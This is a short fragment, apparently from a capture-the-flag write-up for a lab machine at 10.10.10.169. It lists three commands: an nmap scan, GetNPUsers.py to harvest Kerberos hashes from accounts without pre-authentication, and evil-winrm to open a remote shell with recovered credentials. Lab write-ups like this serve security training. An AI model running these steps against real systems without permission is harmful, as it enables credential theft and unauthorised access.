...
```bash
nmap -sC -sV -p- -T4 -oN nmap.txt 10.10.10.169
```
...
```bash
GetNPUsers.py -dc-ip 10.10.10.169 -no-pass -usersfile users.txt domains/
```
...
```bash
evil-winrm -i 10.10.10.169 -u username -p password
```
